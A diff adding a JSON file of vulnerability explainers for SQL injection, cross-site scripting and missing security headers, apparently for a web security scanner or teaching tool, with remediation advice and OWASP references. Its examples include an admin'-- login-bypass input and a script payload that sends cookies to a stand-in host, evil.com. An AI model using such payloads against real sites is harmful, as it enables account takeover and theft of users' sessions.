@@ -1,0 +1,38 @@
+{
+  "sqli": {
+    "name": "SQL Injection",
+    "short": "Attacker inserts malicious SQL code into database queries.",
+    "what": "SQL Injection (SQLi) occurs when an attacker is able to insert or 'inject' malicious SQL statements into a query that the application sends to its database. This happens when user-supplied input is not properly validated or sanitised before being used in a SQL query.",
+    "how": "For example, consider a login form that checks: SELECT * FROM users WHERE username='INPUT'. If an attacker enters admin'-- as the username, the query becomes SELECT * FROM users WHERE username='admin'-- which comments out the password check, letting them log in as admin without a password.",
+    "why": "SQL Injection can allow attackers to: bypass authentication, read sensitive data (passwords, credit cards, personal information), modify or delete data, execute admin operations on the database server, and in some cases gain full control of the web server.",
+    "fix": "1. Use parameterised queries (prepared statements) — never concatenate user input into SQL strings.\n2. Use an ORM (Object Relational Mapper) like SQLAlchemy which handles this automatically.\n3. Apply input validation — reject unexpected characters.\n4. Use a Web Application Firewall (WAF).\n5. Apply the principle of least privilege — database accounts should only have the permissions they need.",
+    "references": [
+      "OWASP SQL Injection Prevention Cheat Sheet",
+      "CWE-89: Improper Neutralization of Special Elements in SQL Command"
+    ]
+  },
+  "xss": {
+    "name": "Cross-Site Scripting (XSS)",
+    "short": "Attacker injects malicious scripts into pages viewed by other users.",
+    "what": "Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious client-side scripts (usually JavaScript) into web pages viewed by other users. The browser cannot tell the difference between legitimate and injected scripts, so it executes both.",
+    "how": "Example: A search page displays 'Results for: [your search term]'. If the application doesn't encode the output, an attacker can search for <script>document.location='https://evil.com/steal?c='+document.cookie</script> and then share that URL with victims. When victims click the link, their cookies are sent to the attacker's server.",
+    "why": "XSS can be used to: steal session cookies (account takeover without needing a password), redirect users to phishing sites, log everything a user types (keylogging), perform actions on behalf of the victim, deface web pages, distribute malware.",
+    "fix": "1. HTML-encode all user input before displaying it in the page (convert < to &lt;, > to &gt;, etc.).\n2. Use modern frameworks that auto-escape output (React, Angular, Jinja2 with autoescape).\n3. Implement a strong Content-Security-Policy (CSP) header.\n4. Validate and sanitise all input on the server side.\n5. Use HTTPOnly cookies so scripts cannot access them.",
+    "references": [
+      "OWASP XSS Prevention Cheat Sheet",
+      "CWE-79: Improper Neutralization of Input During Web Page Generation"
+    ]
+  },
+  "header": {
+    "name": "Missing Security Headers",
+    "short": "HTTP response headers that improve security are absent.",
+    "what": "HTTP security headers are special response headers that instruct browsers how to behave when handling the website's content. When these headers are missing or misconfigured, the browser cannot enforce important security protections, leaving users vulnerable to various attacks.",
+    "how": "Browsers are very powerful applications. They can display content in iframes, run scripts from any origin, and interpret files in multiple ways. Security headers are the web server's way of telling the browser: 'Don't do these dangerous things with my pages.' Without them, browsers use permissive defaults.",
+    "why": "Missing security headers can enable: Clickjacking (X-Frame-Options), MIME-type attacks (X-Content-Type-Options), Man-in-the-Middle attacks (HSTS), Cross-Site Scripting (CSP), information leakage (Referrer-Policy), and camera/microphone access by malicious scripts (Permissions-Policy).",
+    "fix": "Add the appropriate security headers to your web server configuration or application code. In Flask, you can use the flask-talisman extension to add all security headers automatically, or set them manually in response objects.",
+    "references": [
+      "OWASP Secure Headers Project",
+      "MDN Web Docs: HTTP Security Headers"
+    ]
+  }
+}
